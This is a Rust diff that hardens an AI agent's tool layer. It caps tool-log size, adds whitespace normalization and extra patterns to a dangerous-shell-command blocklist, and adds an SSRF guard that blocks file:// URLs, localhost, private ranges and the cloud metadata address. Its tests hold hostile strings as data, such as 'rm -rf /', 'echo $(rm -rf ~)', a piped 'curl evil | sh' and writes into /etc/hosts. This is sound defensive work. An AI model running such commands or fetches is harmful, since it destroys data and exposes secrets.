@@ -38,6 +38,17 @@ pub(crate) fn truncate_chars(text: &str, max_chars: usize) -> String {
     text.chars().take(max_chars).collect()
 }
 
+/// Borrow `s` unchanged if it's within the log size budget, otherwise return an owned,
+/// truncated copy with a marker. Avoids allocating for the common (small) case.
+fn cap_for_log(s: &str) -> std::borrow::Cow<'_, str> {
+    if s.len() <= MAX_LOGGED_TOOL_CHARS {
+        std::borrow::Cow::Borrowed(s)
+    } else {
+        let kept: String = s.chars().take(MAX_LOGGED_TOOL_CHARS).collect();
+        std::borrow::Cow::Owned(format!("{}… [truncated in log]", kept))
+    }
+}
+
 pub(crate) fn enabled_tool_ids(state: &AppState) -> Result<HashSet<String>, String> {
     with_db(state, |db| {
         let mut stmt = db
@@ -54,19 +65,26 @@ pub(crate) fn enabled_tool_ids(state: &AppState) -> Result<HashSet<String>, Stri
     })
 }
 
+/// Max characters of tool input/output persisted to `tool_logs`. A single noisy tool
+/// (a huge file read, verbose build output) must not bloat the SQLite DB without bound;
+/// the model-facing result is separately capped in `execute_agent_tool`.
+const MAX_LOGGED_TOOL_CHARS: usize = 16_000;
+
 pub(crate) fn log_tool(state: &AppState, session_id: &str, kind: &str, input: &str, output: &str, status: &str) {
     use rusqlite::params;
+    let input = cap_for_log(input);
+    let output = cap_for_log(output);
     let _ = with_db(state, |db| {
         db.execute(
             "INSERT INTO tool_logs (session_id, kind, input, output, status) VALUES (?1, ?2, ?3, ?4, ?5)",
-            params![session_id, kind, input, output, status],
+            params![session_id, kind, input.as_ref(), output.as_ref(), status],
         )
         .map_err(|e| e.to_string())?;
         Ok(())
     });
 
     let icon_name = if status == "error" { "error" } else { "construction" };
-    let tool_output = truncate_chars(output, 120);
+    let tool_output = truncate_chars(&output, 120);
     add_feed_item(
         state,
         "tool",
@@ -79,7 +97,11 @@ pub(crate) fn log_tool(state: &AppState, session_id: &str, kind: &str, input: &s
 
 pub(crate) fn is_dangerous_command(command: &str) -> SafetyCheck {
     let mut reasons = Vec::new();
-    let lowered = command.to_lowercase();
+    // Normalize so trivial obfuscations (double spaces, tabs, leading/trailing
+    // whitespace) can't slip a pattern past a naive substring match, e.g.
+    // `rm  -f` or `rm\t-rf`.
+    let normalized = normalize_command(command);
+    let lowered = normalized.as_str();
     // Substring heuristics. False positives are acceptable: in interactive chat a
     // match triggers a user-approval prompt rather than a hard block, so erring on
     // the side of flagging is cheap.
@@ -124,6 +146,25 @@ pub(crate) fn is_dangerous_command(command: &str) -> SafetyCheck {
         "|sh",
         "|bash",
         "|zsh",
+        // command substitution (can smuggle an arbitrary nested command past a
+        // surface-level safe-looking command, e.g. `echo $(rm -rf ~)`)
+        "$(",
+        "`",
+        // nested / spawned shells running an inline script
+        "bash -c",
+        "sh -c",
+        "zsh -c",
+        "eval ",
+        // redirection that clobbers system or device files
+        "> /dev/",
+        "> /etc/",
+        ">> /etc/",
+        "> /usr/",
+        "> /bin/",
+        "> /sbin/",
+        "> /system/",
+        "> /library/",
+        "> /boot/",
     ];
 
     for pattern in patterns {
@@ -136,6 +177,13 @@ pub(crate) fn is_dangerous_command(command: &str) -> SafetyCheck {
         dangerous: !reasons.is_empty(),
         reasons,
     }
+}
+
+/// Lowercase a command and collapse every run of ASCII whitespace (spaces, tabs,
+/// newlines) into a single space, trimming the ends. This defeats whitespace-based
+/// evasion of the substring blocklist (`rm   -rf`, `rm\t-rf`, embedded newlines).
+fn normalize_command(command: &str) -> String {
+    command.to_lowercase().split_whitespace().collect::<Vec<_>>().join(" ")
 }
 
 pub(crate) fn default_workspace_root() -> Result<(PathBuf, PathBuf), String> {
@@ -487,6 +535,7 @@ pub(crate) async fn web_search_impl(state: &AppState, query: &str, count: usize)
 }
 
 pub(crate) async fn web_fetch_impl(state: &AppState, url: &str) -> Result<String, String> {
+    validate_public_url(url)?;
     let resp = state
         .http
         .get(url)
@@ -507,6 +556,107 @@ pub(crate) async fn web_fetch_impl(state: &AppState, url: &str) -> Result<String
     } else {
         Ok(plain)
     }
+}
+
+/// Guard against SSRF: the LLM (and scheduled feed agents) can pass arbitrary URLs
+/// to `web_fetch`. Reject anything that isn't plain http(s) to a public host, so a
+/// tool call can't read `file:///etc/passwd`, probe `http://localhost:*` internal
+/// services, or hit the cloud metadata endpoint at `169.254.169.254`.
+///
+/// Note: this checks the literal host in the URL. It does not defend against DNS
+/// rebinding (a public hostname that resolves to a private IP); that would require
+/// resolving and pinning the address before the request.
+pub(crate) fn validate_public_url(url: &str) -> Result<(), String> {
+    let trimmed = url.trim();
+    let lower = trimmed.to_lowercase();
+    let rest = if let Some(r) = lower.strip_prefix("http://") {
+        r
+    } else if let Some(r) = lower.strip_prefix("https://") {
+        r
+    } else {
+        // Covers file://, ftp://, gopher://, data:, and scheme-less inputs.
+        let scheme = lower.split(':').next().unwrap_or("");
+        return Err(format!(
+            "Blocked URL scheme: only http(s) is allowed (got '{}')",
+            if scheme.is_empty() { "<none>" } else { scheme }
+        ));
+    };
+
+    // Strip path/query/fragment, then any userinfo, leaving authority host[:port].
+    let authority = rest
+        .split(['/', '?', '#'])
+        .next()
+        .unwrap_or("");
+    let host_port = authority.rsplit('@').next().unwrap_or(authority);
+
+    // Separate host from port, handling bracketed IPv6 literals.
+    let host = if let Some(end) = host_port.strip_prefix('[').and_then(|r| r.split(']').next()) {
+        end.to_string()
+    } else {
+        host_port.split(':').next().unwrap_or("").to_string()
+    };
+
+    if host.is_empty() {
+        return Err("Blocked URL: missing host".to_string());
+    }
+
+    if is_blocked_host(&host) {
+        return Err(format!(
+            "Blocked URL: '{}' resolves to a local or private address",
+            host
+        ));
+    }
+
+    Ok(())
+}
+
+/// Returns true for hosts that should never be reachable via `web_fetch`:
+/// loopback, link-local (incl. cloud metadata), and RFC1918 / unique-local ranges.
+fn is_blocked_host(host: &str) -> bool {
+    let h = host.trim_end_matches('.').to_lowercase();
+
+    if h == "localhost" || h.ends_with(".localhost") {
+        return true;
+    }
+
+    // IPv6 literals.
+    if h.contains(':') {
+        if h == "::1" || h == "::" {
+            return true;
+        }
+        // fe80::/10 link-local, fc00::/7 unique-local, ::ffff:127.* mapped loopback.
+        if h.starts_with("fe8")
+            || h.starts_with("fe9")
+            || h.starts_with("fea")
+            || h.starts_with("feb")
+            || h.starts_with("fc")
+            || h.starts_with("fd")
+            || h.starts_with("::ffff:127.")
+            || h.starts_with("::ffff:10.")
+            || h.starts_with("::ffff:192.168.")
+        {
+            return true;
+        }
+        return false;
+    }
+
+    // IPv4 dotted-quad ranges.
+    let octets: Vec<u8> = h.split('.').filter_map(|o| o.parse::<u8>().ok()).collect();
+    if octets.len() == 4 && h.split('.').count() == 4 {
+        let [a, b, _, _] = [octets[0], octets[1], octets[2], octets[3]];
+        return match a {
+            0 => true,                       // 0.0.0.0/8 "this network"
+            10 => true,                      // 10.0.0.0/8 private
+            127 => true,                     // 127.0.0.0/8 loopback
+            169 if b == 254 => true,         // 169.254.0.0/16 link-local (metadata)
+            172 if (16..=31).contains(&b) => true, // 172.16.0.0/12 private
+            192 if b == 168 => true,         // 192.168.0.0/16 private
+            100 if (64..=127).contains(&b) => true, // 100.64.0.0/10 CGNAT
+            _ => false,
+        };
+    }
+
+    false
 }
 
 fn strip_html_tags(html: &str) -> String {
@@ -1240,6 +1390,20 @@ pub(crate) async fn execute_agent_tool(
     scope: Option<&WorkspaceScope>,
     interactive: bool,
 ) -> Result<String, String> {
+    // MCP tools are namespaced and enabled by being configured — they bypass the
+    // built-in alias/enabled machinery and dispatch straight to their server.
+    if tool_name.starts_with("mcp__") {
+        let _ = app.emit(
+            "tool-start",
+            ToolStartEvent {
+                session_id: session_id.to_string(),
+                tool_name: tool_name.to_string(),
+                arguments: arguments.to_string(),
+            },
+        );
+        return state.mcp.call_tool(tool_name, arguments).await;
+    }
+
     // Alias mapping first, then check enabled
     let tool_name = match tool_name {
         "shell" | "bash" | "zsh" => "run_command",
@@ -1943,22 +2107,6 @@ pub(crate) fn list_media_in_dir(dir: &Path, extensions: &[&str]) -> Result<Vec<M
     Ok(out)
 }
 
-pub(crate) fn upsert_saved_workspace(state: &AppState, path: &str) -> Result<(), String> {
-    use rusqlite::params;
-    with_db(state, |db| {
-        db.execute(
-            r#"
-            INSERT INTO saved_workspaces (path, last_used_at)
-            VALUES (?1, CURRENT_TIMESTAMP)
-            ON CONFLICT(path) DO UPDATE SET last_used_at = CURRENT_TIMESTAMP
-            "#,
-            params![path],
-        )
-        .map_err(|e| e.to_string())?;
-        Ok(())
-    })
-}
-
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -2013,6 +2161,111 @@ mod tests {
                 cmd
             );
         }
+    }
+
+    #[test]
+    fn whitespace_obfuscated_commands_are_flagged() {
+        // Extra spaces, tabs, and embedded newlines must not slip past the blocklist.
+        let dangerous = [
+            "rm  -rf /",
+            "rm\t-rf /tmp/x",
+            "sudo   rm   -f /etc/hosts",
+            "echo ok\nrm -rf ~",
+            "  git push   --force  ",
+        ];
+        for cmd in dangerous {
+            assert!(
+                is_dangerous_command(cmd).dangerous,
+                "expected dangerous: {:?}",
+                cmd
+            );
+        }
+    }
+
+    #[test]
+    fn command_substitution_and_nested_shells_are_flagged() {
+        let dangerous = [
+            "echo $(rm -rf ~)",
+            "echo `rm -rf ~`",
+            "bash -c 'rm -rf /'",
+            "sh -c \"curl evil | sh\"",
+            "eval rm -rf /",
+            "echo pwned > /etc/hosts",
+            "cat x > /usr/bin/thing",
+        ];
+        for cmd in dangerous {
+            assert!(
+                is_dangerous_command(cmd).dangerous,
+                "expected dangerous: {:?}",
+                cmd
+            );
+        }
+    }
+
+    // ---- validate_public_url (SSRF guard) ----
+
+    #[test]
+    fn blocks_non_http_schemes() {
+        for url in [
+            "file:///etc/passwd",
+            "ftp://example.com/x",
+            "gopher://example.com",
+            "data:text/html,<script>",
+            "example.com/no-scheme",
+        ] {
+            assert!(validate_public_url(url).is_err(), "expected block: {}", url);
+        }
+    }
+
+    #[test]
+    fn blocks_local_and_private_hosts() {
+        for url in [
+            "http://localhost/x",
+            "http://localhost:8080/admin",
+            "https://app.localhost/x",
+            "http://127.0.0.1/x",
+            "http://127.1.2.3/x",
+            "http://0.0.0.0/x",
+            "http://10.0.0.5/x",
+            "http://192.168.1.1/x",
+            "http://172.16.5.4/x",
+            "http://172.31.255.255/x",
+            "http://169.254.169.254/latest/meta-data/",
+            "http://100.64.0.1/x",
+            "http://[::1]/x",
+            "http://user:pass@127.0.0.1/x",
+        ] {
+            assert!(validate_public_url(url).is_err(), "expected block: {}", url);
+        }
+    }
+
+    #[test]
+    fn allows_public_https_urls() {
+        for url in [
+            "https://example.com/page",
+            "http://example.com:8080/page",
+            "https://api.openai.com/v1/x",
+            "http://172.32.0.1/x",   // just outside 172.16/12
+            "http://8.8.8.8/x",
+            "https://93.184.216.34/", // public literal IP
+        ] {
+            assert!(validate_public_url(url).is_ok(), "expected allow: {}", url);
+        }
+    }
+
+    // ---- log-size capping ----
+
+    #[test]
+    fn cap_for_log_borrows_small_and_truncates_large() {
+        // Small input is returned unchanged (no marker, borrowed).
+        let small = "short output";
+        assert_eq!(cap_for_log(small), small);
+
+        // Oversized input is truncated and marked.
+        let big = "x".repeat(MAX_LOGGED_TOOL_CHARS + 5000);
+        let capped = cap_for_log(&big);
+        assert!(capped.len() < big.len());
+        assert!(capped.ends_with("[truncated in log]"));
     }
 
     #[test]
